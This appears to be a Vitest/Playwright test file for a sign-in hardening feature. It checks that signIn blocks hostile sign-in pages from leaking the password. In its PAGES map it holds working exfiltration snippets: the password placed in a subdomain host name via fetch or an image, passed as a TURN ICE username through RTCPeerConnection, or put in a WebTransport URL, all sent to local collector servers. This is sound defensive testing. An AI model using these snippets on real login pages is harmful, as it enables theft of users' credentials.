/**
 * signIn keeps the password on the sign-in page's origin through channels a hostile sign-in page could still use (0.6.0,
 * round 1 of the release review; docs/v2-spec.md "Sign-in: two-step and sessionStorage": "a request carrying it to
 * another origin or in a URL is stopped"):
 * - **The host name of a request.** A script that puts the password in a subdomain (fetch or an image to
 *   http://<password>.localhost:<port>/) sent it to another origin unstopped: the address's query, hash, path and user
 *   info were read, never its host name. A password that isn't weak is now looked for in the host name too (host names
 *   are lower-case, so compared so), and the request is stopped before it leaves the browser. The message never shows
 *   the address (it would show the password, lower-cased, which the redaction doesn't know).
 * - **WebRTC.** A page that hands the password to a TURN server as the ICE username (RTCPeerConnection) sends it over
 *   UDP, which no interception layer sees. SIGN_IN_HARDENING replaces RTCPeerConnection and webkitRTCPeerConnection
 *   in every frame with constructors that throw, before any page script runs; a frame the page makes itself (an
 *   about:blank iframe) gets them too.
 * - **WebTransport**, the other API that opens a connection no interception layer sees (HTTP/3), is blocked the same
 *   way: the page can't construct one during sign-in.
 *
 * Each channel is first driven by hand in a plain browser (no signIn), which shows it carries the password out: so each
 * signIn test fails only for signIn's reasons. What must not happen gets a set time to show up (SETTLE_MS).
 */
import { createSocket, type Socket as UdpSocket } from "node:dgram";
import { createServer, type IncomingMessage, type Server } from "node:http";
import type { AddressInfo } from "node:net";
import type { Browser } from "playwright";
import { afterAll, beforeAll, describe, expect, it } from "vitest";
import { closeBrowser, getBrowser } from "../../test-support/harness.js";
import { json, startFixtureServer, type FixtureServer } from "../../test-support/server.js";
import type { TestAccount } from "../interfaces/accounts.js";
import { signIn, SignInError, type SignedIn } from "./auth.js";

const EMAIL = "someone@example.test";
/** Lower-case letters and digits: a valid host name label as it is. */
const PASSWORD = "hunter2correcthorse91";
/** Mixed case: a host name holds it lower-cased. */
const MIXED = "Hunter2CorrectHorse91";
const SETTLE_MS = 1_500;

let browser: Browser;
let site: FixtureServer;
/** What the collector (another origin: any *.localhost host name on its port) saw: each request's Host header and path. */
let collector: Server;
let collectorPort: number;
const seen: { host: string; url: string }[] = [];
/** The TURN server (UDP on 127.0.0.1): the USERNAME attribute of every STUN message it got. */
let turn: UdpSocket;
let turnPort: number;
const turnUsernames: string[] = [];

/** Answers a TURN Allocate with 401 + REALM + NONCE (so the client retries with its USERNAME), and records usernames. */
function answerTurn(msg: Buffer, rinfo: { port: number; address: string }): void {
  if (msg.length < 20 || msg.readUInt32BE(4) !== 0x2112a442) return;
  const type = msg.readUInt16BE(0);
  let offset = 20;
  while (offset + 4 <= msg.length) {
    const attribute = msg.readUInt16BE(offset);
    const length = msg.readUInt16BE(offset + 2);
    if (attribute === 0x0006) turnUsernames.push(msg.subarray(offset + 4, offset + 4 + length).toString("utf8"));
    offset += 4 + length + ((4 - (length % 4)) % 4);
  }
  if (type !== 0x0003) return;
  const attr = (t: number, value: Buffer) => {
    const head = Buffer.alloc(4);
    head.writeUInt16BE(t, 0);
    head.writeUInt16BE(value.length, 2);
    return Buffer.concat([head, value, Buffer.alloc((4 - (value.length % 4)) % 4)]);
  };
  const attrs = Buffer.concat([
    attr(0x0009, Buffer.concat([Buffer.from([0, 0, 4, 1]), Buffer.from("Unauthorized")])),
    attr(0x0014, Buffer.from("probe")),
    attr(0x0015, Buffer.from("n0nce1234567")),
  ]);
  const header = Buffer.alloc(20);
  header.writeUInt16BE(0x0113, 0);
  header.writeUInt16BE(attrs.length, 2);
  header.writeUInt32BE(0x2112a442, 4);
  msg.subarray(8, 20).copy(header, 8);
  turn.send(Buffer.concat([header, attrs]), rinfo.port, rinfo.address);
}

const shell = (title: string, body: string) =>
  `<!doctype html><html lang="en"><head><meta charset="utf-8"><title>${title}</title></head><body><main>${body}</main></body></html>`;

/**
 * A sign-in page that, once /api/login answers 200, runs `exfil` (a statement with `pw`, `CPORT` the collector's port,
 * `TURN` the TURN server's port and `report(what)`, a synchronous same-origin report) and then removes the form after
 * `settle` ms (so the page stays alive while the channel works), which signs it in.
 */
const exfilPage = (exfil: string, settle = 300) =>
  shell(
    "Sign in",
    `<h1>Sign in</h1><form id="f" aria-label="Sign in"><label for="e">Email</label><input id="e" name="email" type="email" autocomplete="username">
<label for="pw">Password</label><input id="pw" name="password" type="password" autocomplete="current-password"><button type="submit">Sign in</button></form>
<h2 id="ok" hidden>Signed in.</h2>
<script>
var CPORT = ${collectorPort}, TURN = ${turnPort};
function report(what) { var x = new XMLHttpRequest(); x.open("POST", "/api/report?what=" + encodeURIComponent(what), false); x.send(); }
function turnPeer(Ctor, pw) {
  var pc = new Ctor({ iceServers: [{ urls: "turn:127.0.0.1:" + TURN + "?transport=udp", username: pw, credential: "x" }], iceTransportPolicy: "relay" });
  pc.createDataChannel("d");
  pc.createOffer().then(function (o) { return pc.setLocalDescription(o); });
}
document.getElementById("f").addEventListener("submit", function (e) {
  e.preventDefault();
  var pw = document.getElementById("pw").value;
  fetch("/api/login", { method: "POST", headers: { "content-type": "application/json" }, body: JSON.stringify({ email: document.getElementById("e").value, password: pw }) })
    .then(function (r) {
      if (!r.ok) return;
      try { ${exfil} } catch (err) { report("threw:" + String(err && err.message)); }
      setTimeout(function () { document.getElementById("f").remove(); document.getElementById("ok").hidden = false; }, ${settle});
    });
});
</script>`,
  );

const PAGES: Record<string, string> = {
  // The password as the host name of a fetch and of an image (*.localhost is the loopback address in Chromium).
  "/host-fetch": `fetch("http://" + pw + ".localhost:" + CPORT + "/h", { mode: "no-cors" });`,
  "/host-image": `new Image().src = "http://" + pw + ".localhost:" + CPORT + "/img.gif";`,
  // A label with other characters around the password.
  "/host-around": `fetch("http://x-" + pw + "-y.localhost:" + CPORT + "/around", { mode: "no-cors" });`,
  // The password as a TURN server's ICE username, through each constructor, and through an about:blank frame's.
  "/turn": `turnPeer(RTCPeerConnection, pw); report("made");`,
  "/turn-webkit": `turnPeer(webkitRTCPeerConnection, pw); report("made");`,
  "/turn-frame": `var fr = document.createElement("iframe"); document.body.appendChild(fr); turnPeer(fr.contentWindow.RTCPeerConnection, pw); report("made");`,
  // A WebTransport session to the collector's port with the password in its address (nothing listens for HTTP/3 there).
  "/webtransport": `var wt = new WebTransport("https://127.0.0.1:" + CPORT + "/wt?p=" + encodeURIComponent(pw)); if (wt.ready) wt.ready.catch(function () {}); report("made");`,
};

beforeAll(async () => {
  browser = await getBrowser();
  collector = createServer((req: IncomingMessage, res) => {
    seen.push({ host: String(req.headers.host ?? ""), url: req.url ?? "" });
    res.writeHead(200, { "access-control-allow-origin": "*", "content-type": "text/plain" });
    res.end("ok");
  });
  await new Promise<void>((resolve) => collector.listen(0, "127.0.0.1", resolve));
  collectorPort = (collector.address() as AddressInfo).port;
  turn = createSocket("udp4");
  turn.on("message", answerTurn);
  await new Promise<void>((resolve) => turn.bind(0, "127.0.0.1", resolve));
  turnPort = turn.address().port;
  site = await startFixtureServer({
    pages: Object.fromEntries(Object.entries(PAGES).map(([path, exfil]) => [path, exfilPage(exfil, path.startsWith("/turn") ? 1_500 : 300)])),
    routes: {
      "POST /api/login": (req, res) => {
        const body = JSON.parse(req.body || "{}") as { email?: string; password?: string };
        const ok = body.email === EMAIL && (body.password === PASSWORD || body.password === MIXED);
        if (!ok) return json(res, 401, { error: "Email or password is incorrect" });
        res.setHeader("set-cookie", "sid=s3ss10nT0kenValue1234567890; Path=/; HttpOnly");
        json(res, 200, { ok: true });
      },
      "POST /api/report": (_req, res) => {
        res.writeHead(204);
        res.end();
      },
      "GET /favicon.ico": (_req, res) => {
        res.writeHead(204);
        res.end();
      },
    },
  });
});

afterAll(async () => {
  await closeBrowser();
  await site?.close();
  await new Promise<void>((resolve) => collector?.close(() => resolve()));
  turn?.close();
});

/** The sign-in page's address as localhost (the collector's host names are *.localhost, another origin by port). */
const pageUrl = (path: string) => `http://localhost:${new URL(site.url).port}${path}`;
const account = (path: string, password = PASSWORD): TestAccount => ({ id: "a", label: "Account A", loginUrl: pageUrl(path), username: EMAIL, password });

const reports = () => site.requests.filter((r) => r.url.startsWith("/api/report?")).map((r) => new URL(r.url, "http://x").searchParams.get("what"));
const settle = () => new Promise((resolve) => setTimeout(resolve, SETTLE_MS));

function reset(): void {
  seen.length = 0;
  turnUsernames.length = 0;
  site.requests.length = 0;
}

/** Signs in by hand in a plain browser context, on `path`, with `password`, and waits for the page to say it is signed in. */
async function byHand(path: string, password = PASSWORD): Promise<void> {
  const context = await browser.newContext();
  try {
    const page = await context.newPage();
    await page.goto(pageUrl(path));
    await page.locator("#e").fill(EMAIL);
    await page.locator("#pw").fill(password);
    await page.locator("#f button[type=submit]").click();
    await page.locator("#ok").waitFor();
  } finally {
    await context.close();
  }
}

async function outcomeOf(promise: Promise<SignedIn>): Promise<SignedIn | SignInError> {
  return promise.then(
    (result) => result,
    (err: unknown) => {
      if (err instanceof SignInError) return err;
      throw err;
    },
  );
}

const hostCarries = (password: string) => seen.filter((s) => s.host.toLowerCase().includes(password.toLowerCase()));

describe("signIn stops the password in the host name of a request to another origin", () => {
  for (const path of ["/host-fetch", "/host-image", "/host-around"]) {
    it(`by hand, ${path} sends the password to the collector in its Host header`, async () => {
      reset();
      await byHand(path);
      await expect.poll(() => hostCarries(PASSWORD).length).toBeGreaterThan(0);
    });

    it(`with signIn, ${path}: the request is stopped, and signing in fails without showing the password`, async () => {
      reset();
      const outcome = await outcomeOf(signIn(browser, account(path)));
      await settle();
      expect(hostCarries(PASSWORD), "requests whose host name carried the password").toEqual([]);
      expect(outcome, "signIn should have failed").toBeInstanceOf(SignInError);
      const message = (outcome as SignInError).message;
      expect(message).toMatch(/sends the password to another site/);
      expect(message.toLowerCase()).not.toContain(PASSWORD);
    });
  }

  it("a mixed-case password (a host name holds it lower-cased): stopped, and the message shows it in neither case", async () => {
    reset();
    await byHand("/host-fetch", MIXED);
    await expect.poll(() => hostCarries(MIXED).length).toBeGreaterThan(0);
    reset();
    const outcome = await outcomeOf(signIn(browser, account("/host-fetch", MIXED)));
    await settle();
    expect(hostCarries(MIXED)).toEqual([]);
    expect(outcome).toBeInstanceOf(SignInError);
    expect((outcome as SignInError).message.toLowerCase()).not.toContain(MIXED.toLowerCase());
  });
});

describe("signIn: no WebRTC connection during sign-in (a TURN server's ICE username is sent over UDP, which nothing intercepts)", () => {
  for (const path of ["/turn", "/turn-webkit", "/turn-frame"]) {
    it(`by hand, ${path} hands the password to the TURN server`, async () => {
      reset();
      await byHand(path);
      await expect.poll(() => turnUsernames).toContain(PASSWORD);
      expect(reports()).toEqual(["made"]);
    });

    it(`with signIn, ${path}: the constructor throws, the TURN server never gets the password, and signing in succeeds`, async () => {
      reset();
      const outcome = await outcomeOf(signIn(browser, account(path)));
      await settle();
      expect(turnUsernames).not.toContain(PASSWORD);
      expect(turnUsernames).toEqual([]);
      expect(reports()).toEqual([expect.stringMatching(/^threw:.*Run Hound/)]);
      expect(outcome, "signIn should have succeeded").toHaveProperty("state");
    });
  }
});

describe("signIn: no WebTransport session during sign-in", () => {
  it("by hand, the page constructs one", async () => {
    reset();
    await byHand("/webtransport");
    expect(reports()).toEqual(["made"]);
  });

  it("with signIn, the constructor throws", async () => {
    reset();
    const outcome = await outcomeOf(signIn(browser, account("/webtransport")));
    expect(reports()).toEqual([expect.stringMatching(/^threw:.*Run Hound/)]);
    expect(outcome, "signIn should have succeeded").toHaveProperty("state");
  });
});
